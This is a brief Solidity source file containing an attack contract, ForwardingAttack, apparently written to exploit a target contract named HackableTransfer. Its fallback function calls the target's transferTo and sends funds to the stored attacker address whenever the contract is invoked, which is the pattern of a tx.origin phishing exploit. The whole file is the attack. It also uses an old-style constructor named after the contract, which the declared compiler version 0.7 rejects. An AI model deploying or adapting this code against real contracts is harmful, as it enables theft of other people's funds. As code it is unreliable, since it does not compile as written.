// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

contract ForwardingAttack {
    HackableTransfer hackable;
    address attacker;

    function ForwardingAttack (address _hackable) public {
        hackable = HackableTransfer(_hackable);
        attacker = msg.sender;
    }

    fallback() external payable {
        hackable.transferTo(attacker);
    }
}